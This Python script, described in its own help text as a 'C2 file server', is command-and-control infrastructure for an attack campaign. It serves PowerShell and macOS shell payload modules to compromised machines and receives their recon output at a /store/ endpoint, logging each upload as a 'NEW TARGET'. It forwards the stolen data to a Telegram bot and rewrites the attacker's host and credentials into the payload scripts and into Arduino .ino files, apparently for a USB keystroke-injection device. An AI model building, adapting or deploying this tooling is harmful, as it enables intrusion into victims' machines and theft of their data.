#!/usr/bin/env python3
import argparse
import base64
import hashlib
import mimetypes
import os
import re
import ssl
import threading
import urllib.request
import urllib.parse
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# ── Load .env ─────────────────────────────────────────────
def _load_env(path=".env"):
    if not os.path.exists(path):
        return
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            k, v = line.split("=", 1)
            os.environ.setdefault(k.strip(), v.strip())

_load_env()

# ── Telegram ──────────────────────────────────────────────
TG_TOKEN   = os.environ.get("TG_TOKEN", "")
TG_CHAT_ID = os.environ.get("TG_CHAT_ID", "")

def tg_notify(text):
    def _send():
        try:
            url  = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
            data = urllib.parse.urlencode({
                "chat_id":    TG_CHAT_ID,
                "text":       text,
                "parse_mode": "HTML"
            }).encode()
            urllib.request.urlopen(url, data, timeout=5)
        except Exception:
            pass
    threading.Thread(target=_send, daemon=True).start()

def tg_send_file(filename, content, caption=""):
    def _send():
        try:
            boundary = "TGFileBoundary"
            lines = []

            def field(name, value):
                lines.append(f"--{boundary}".encode())
                lines.append(f'Content-Disposition: form-data; name="{name}"'.encode())
                lines.append(b"")
                lines.append(value.encode() if isinstance(value, str) else value)

            field("chat_id", TG_CHAT_ID)
            if caption:
                field("caption", caption[:1024])

            lines.append(f"--{boundary}".encode())
            lines.append(f'Content-Disposition: form-data; name="document"; filename="{filename}"'.encode())
            lines.append(b"Content-Type: text/plain")
            lines.append(b"")
            lines.append(content.encode("utf-8", errors="replace"))
            lines.append(f"--{boundary}--".encode())

            body = b"\r\n".join(lines)
            url  = f"https://api.telegram.org/bot{TG_TOKEN}/sendDocument"
            req  = urllib.request.Request(url, data=body)
            req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
            urllib.request.urlopen(req, timeout=10)
        except Exception:
            pass
    threading.Thread(target=_send, daemon=True).start()

# ── CONFIG (defaults, overridden by .env then CLI args) ──
USERNAME  = "admin"
PASSWORD  = "secret"
# ─────────────────────────────────────────────────────────

BASE_DIR    = os.getcwd()
MODULS_DIR  = os.path.join(BASE_DIR, "moduls")
OUTPUTS_DIR = os.path.join(BASE_DIR, "outputs")

EXPECTED_INIT = ""  # auth for init.ps1 (Auth X)
EXPECTED_MODS = ""  # auth for all other modules + recon (Auth Y)


class Handler(BaseHTTPRequestHandler):

    # ── Auth ─────────────────────────────────────────────
    def _check_auth(self, expected):
        auth = self.headers.get("Authorization", "")
        if not auth.startswith("Basic "):
            self._deny(); return False
        if auth.split(" ", 1)[1].strip() != expected:
            self._deny(); return False
        return True

    def _deny(self):
        self.send_response(401)
        self.send_header("WWW-Authenticate", 'Basic realm="restricted"')
        self.end_headers()
        self.wfile.write(b"401 Unauthorized\n")

    def _error(self, code):
        self.send_response(code)
        self.end_headers()

    # ── Path traversal guard ─────────────────────────────
    def _safe_resolve(self, base, filename):
        base   = os.path.realpath(base)
        target = os.path.realpath(os.path.join(base, filename))
        if not target.startswith(base + os.sep):
            return None
        return target

    # ── GET /moduls/<file> ───────────────────────────────
    def do_GET(self):
        if not self.path.startswith("/moduls/"):
            self._error(404); return

        filename = self.path[len("/moduls/"):]

        if not filename or "/" in filename or "\\" in filename or ".." in filename:
            self._error(403); return

        # init.ps1 uses Auth X, everything else uses Auth Y
        expected = EXPECTED_INIT if filename == "init.ps1" else EXPECTED_MODS
        if not self._check_auth(expected): return

        filepath = self._safe_resolve(MODULS_DIR, filename)
        if not filepath or not os.path.isfile(filepath):
            self._error(404); return

        with open(filepath, "rb") as f:
            data = f.read()

        ctype = mimetypes.guess_type(filename)[0] or "text/plain"
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(data)

    # ── POST /recon/<module> ─────────────────────────────
    def do_POST(self):
        if not self._check_auth(EXPECTED_MODS): return

        if not self.path.startswith("/store/"):
            self._error(404); return

        module = self.path[len("/store/"):]
        if not module or "/" in module or ".." in module:
            self._error(400); return

        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length).decode(errors="replace").strip()

        th = self.headers.get("X-Target", "").strip()
        if not th:
            th = hashlib.sha256(self.client_address[0].encode()).hexdigest()[:8]

        ts   = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        name = f"{ts}_{th}.txt" if module == "init" else f"{ts}_{th}_{module}.txt"

        os.makedirs(OUTPUTS_DIR, exist_ok=True)
        with open(os.path.join(OUTPUTS_DIR, name), "w", encoding="utf-8") as f:
            f.write(f"from   : {self.client_address[0]}\n")
            f.write(f"time   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"module : {module}\n")
            f.write("-" * 40 + "\n")
            f.write(body)

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK\n")

        if module == "init":
            print(f"\n{'='*40}")
            print(f"[+] NEW TARGET  {self.client_address[0]}  hash:{th}")
            print(f"{'='*40}")
            print(body)
            print(f"{'='*40}")
            tg_notify(f"<b>New Target</b>\n<code>IP   : {self.client_address[0]}\nhash : {th}\n\n{body}</code>")

        tg_send_file(
            filename = name,
            content  = open(os.path.join(OUTPUTS_DIR, name), encoding="utf-8").read(),
            caption  = f"{module} | {self.client_address[0]} | {th}"
        )

        print(f"[+] Saved: outputs/{name}")

    def log_message(self, fmt, *args):
        status = args[1] if len(args) > 1 else "-"
        color  = "\033[92m" if str(status).startswith("2") else "\033[91m"
        reset  = "\033[0m"
        print(f"{color}[{self.address_string()}]{reset} {self.command} {self.path} -> {status}")


def patch_init_ps1(lhost, port, mods_token):
    path = os.path.join(MODULS_DIR, "init.ps1")
    if not os.path.exists(path):
        print(f"[!] init.ps1 not found, skipping patch"); return
    with open(path, "r", encoding="utf-8") as f:
        content = f.read()
    content = re.sub(r'\$H\s*=\s*"[^"]*"',   f'$H   = "{lhost}"',             content)
    content = re.sub(r'\$P\s*=\s*"[^"]*"',   f'$P   = "{port}"',              content)
    content = re.sub(r'\$AU\s*=\s*"Basic [^"]*"', f'$AU  = "Basic {mods_token}"', content)
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    print(f"[+] init.ps1     patched  H={lhost}  P={port}  AU=Basic {mods_token[:10]}...")

def patch_ino(filename, lhost, port, init_token, proto):
    path = os.path.join(BASE_DIR, filename)
    if not os.path.exists(path):
        print(f"[!] {filename} not found, skipping patch"); return
    with open(path, "r", encoding="utf-8") as f:
        content = f.read()
    content = re.sub(r'#define LHOST\s+"[^"]*"[^\n]*',     f'#define LHOST     "{lhost}"',           content)
    content = re.sub(r'#define HTTP_PORT\s+"[^"]*"[^\n]*',  f'#define HTTP_PORT "{port}"',             content)
    content = re.sub(r'#define PROTO\s+"[^"]*"[^\n]*',      f'#define PROTO     "{proto}"',            content)
    content = re.sub(r'#define AUTH\s+"Basic [^"]*"[^\n]*', f'#define AUTH      "Basic {init_token}"', content)
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    print(f"[+] {filename:<16} patched  LHOST={lhost}  HTTP_PORT={port}  PROTO={proto}")

def patch_init_mac(lhost, port, mods_token):
    path = os.path.join(MODULS_DIR, "init_mac.sh")
    if not os.path.exists(path):
        print(f"[!] init_mac.sh not found, skipping patch"); return
    with open(path, "r", encoding="utf-8") as f:
        content = f.read()
    content = re.sub(r'^H="[^"]*"',          f'H="{lhost}"',                  content, flags=re.MULTILINE)
    content = re.sub(r'^P="[^"]*"',          f'P="{port}"',                   content, flags=re.MULTILINE)
    content = re.sub(r'^AU="Basic [^"]*"',   f'AU="Basic {mods_token}"',      content, flags=re.MULTILINE)
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    print(f"[+] init_mac.sh  patched  H={lhost}  P={port}  AU=Basic {mods_token[:10]}...")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="C2 file server")
    parser.add_argument("--host",  default="0.0.0.0")
    parser.add_argument("--port",  type=int, default=int(os.environ.get("PORT", 12345)))
    parser.add_argument("--user",  default=os.environ.get("AUTH_USER",  USERNAME),  help="Auth for init.ps1 (Auth X)")
    parser.add_argument("--pass",  dest="password", default=os.environ.get("AUTH_PASS", PASSWORD), help="Auth for init.ps1 (Auth X)")
    parser.add_argument("--muser", default=os.environ.get("AUTH_MUSER") or None, help="Auth for other modules (Auth Y)")
    parser.add_argument("--mpass", default=os.environ.get("AUTH_MPASS") or None, help="Auth for other modules (Auth Y)")
    parser.add_argument("--cert",  default=os.environ.get("CERT")  or None, help="Path to SSL certificate (fullchain.pem)")
    parser.add_argument("--key",   default=os.environ.get("KEY")   or None, help="Path to SSL private key (privkey.pem)")
    parser.add_argument("--lhost", default=os.environ.get("LHOST") or None, help="Public IP/domain to inject into init files")
    args = parser.parse_args()

    muser = args.muser or args.user
    mpass = args.mpass or args.password

    EXPECTED_INIT = base64.b64encode(f"{args.user}:{args.password}".encode()).decode()
    EXPECTED_MODS = base64.b64encode(f"{muser}:{mpass}".encode()).decode()

    os.makedirs(MODULS_DIR,  exist_ok=True)
    os.makedirs(OUTPUTS_DIR, exist_ok=True)

    lhost = args.lhost or args.host
    proto = "https" if args.cert else "http"
    patch_init_ps1(lhost, str(args.port), EXPECTED_MODS)
    patch_init_mac(lhost, str(args.port), EXPECTED_MODS)
    patch_ino("mom.ino",     lhost, str(args.port), EXPECTED_INIT, proto)
    patch_ino("mom_mac.ino", lhost, str(args.port), EXPECTED_INIT, proto)

    same_auth = EXPECTED_INIT == EXPECTED_MODS
    proto     = "https" if args.cert else "http"

    print(f"\nBase dir    : {BASE_DIR}")
    print(f"Listening   : {proto}://{args.host}:{args.port}")
    print(f"Auth X (init.ps1)  : {args.user}:{args.password}  ->  Basic {EXPECTED_INIT}")
    if same_auth:
        print(f"Auth Y (modules)   : same as Auth X")
    else:
        print(f"Auth Y (modules)   : {muser}:{mpass}  ->  Basic {EXPECTED_MODS}")
    print()

    server = HTTPServer((args.host, args.port), Handler)

    if args.cert and args.key:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(certfile=args.cert, keyfile=args.key)
        server.socket = ctx.wrap_socket(server.socket, server_side=True)
        print(f"[+] SSL enabled  cert: {args.cert}")
    else:
        print(f"[!] SSL disabled — running plain HTTP")

    print()
    server.serve_forever()
